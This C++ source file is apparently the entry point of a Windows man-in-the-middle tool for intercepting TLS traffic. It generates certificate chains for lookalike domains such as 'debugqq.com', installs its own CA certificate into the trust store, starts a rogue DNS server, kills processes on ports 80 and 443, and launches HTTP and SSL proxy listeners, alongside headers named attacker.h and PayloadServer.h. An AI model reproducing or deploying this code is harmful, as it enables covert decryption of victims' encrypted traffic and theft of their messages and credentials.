

#include <WINSOCK2.H>
#include <windows.h>
#include <vector>
#include <iostream>
#include "sslEntry.h"
#include "sslPublic.h"
#include "sslPacket.h"
#include "../Utils/Tools.h"
#include "..\\include\\pcap.h"
#include "..\\include\\pcap\\pcap.h"
#include "..\\include\\openssl\\ssl.h"
#include "..\\include\\openssl\\err.h"

#include <DbgHelp.h>
#include "OpenSSLConfig.h"
#include "PayloadServer.h"
#include "WeixinAndroid.h"
#include "../cipher/CryptoUtils.h"
#include "ImportCert.h"
#include "opensslconfig.h"

#include "MakeCert.h"

#include "../FileOper.h"
#include "informerServer.h"
#include "InformerInterface.h"
#include "../attacker.h"
#include "SSLRetransfer.h"
#include "../DnsUtils/DnsServer.h"

#include "HttpProxy.h"
#include "SSLProxy.h"
#include "SSLProxyListener.h"
#include "httpproxylistener.h"
#include "../Deamon.h"
#include "myListener.h"
#include "../DnsUtils/DnsProxy.h"
#include "../DnsUtils/DnsProxyIPV6.h"

using namespace std;

unsigned char	gLocalMac[MAC_ADDRESS_SIZE];

unsigned char	gRouterMac[MAC_ADDRESS_SIZE];

DWORD			gNetmask;

DWORD			gRouterIP = 0;

DWORD			gDnsServer = 0;

unsigned char	gLocalIPV6[16] = { 0 };
DWORD			gLocalIP = 0;
string			gstrLocalIP = "";

DWORD			gServerIP = 0;
string			gstrServerIP = "";

string			gstrNetIP = "";
DWORD			gNetIP = 0;

string			gLocalPath = "";
string			gOpensslPath = "";
string			gOpensslWinPath = "";
string			gOpensslRoot = "";

//msvcr120.dll
//libcrypto-1.1.dll
//libssl-1.1.dll
int __cdecl SSLEntry::SslEntry(unsigned long serverIP,unsigned long localIP,string path,int control,vector<string>host, vector<string>target)
{
	int	ret = 0;

	//system("regsvr32 msvcr120.dll");

	ret = OpenSSLConfig::InitOpenssl(control);
	
	//MakeSureDirectoryPathExists must end with "\\"
	string outputpath = gLocalPath + OUTPUT_PATH + "\\";
	ret = MakeSureDirectoryPathExists(outputpath.c_str());

	string certpath = gLocalPath + CERT_PATH + "\\";
	ret = MakeSureDirectoryPathExists(certpath.c_str());

	string cacertpath = gLocalPath + CA_CERT_PATH + "\\";
	ret = MakeSureDirectoryPathExists(cacertpath.c_str());

	string pluginpath = gLocalPath + "plugin\\";
	ret = MakeSureDirectoryPathExists(pluginpath.c_str());

	ret = MakeCert::checkCAExist();

	ret = SSLPublic::prepareCertChain("debugqq.com");
	ret = SSLPublic::prepareCertChain("assistsqq.com");
	ret = SSLPublic::prepareCertChain("lovemeqq.com");

	MakeCert::initCertMutex();

	ret = ImportCert::ImportCACertification(control);

	InformerServer *informerSvc = new InformerServer();

	Deamon * deamon = new Deamon();

	//DnsProxy *dnsproxy = new DnsProxy(serverIP);
	//DnsProxyIPV6 *dnsproxyipv6 = new DnsProxyIPV6(serverIP);

	DnsServer*dnssvr = new DnsServer();
	
	SSLPublic *sslpublic = new SSLPublic(host, target);

	//OtherListener * other8888 = new OtherListener(1864);//HCDNClientUpdate.ini
	//OtherListener * other1864 = new OtherListener(8888);//tencetvideo pc
	//OtherListener * other9090 = new OtherListener(9090);//letv

	KillProcessPort(80);

	KillProcessPort(443);

	HttpProxyListener *httplistener = new HttpProxyListener();

	SSLProxyListener *ssllistener = new SSLProxyListener();

	return ret;
}
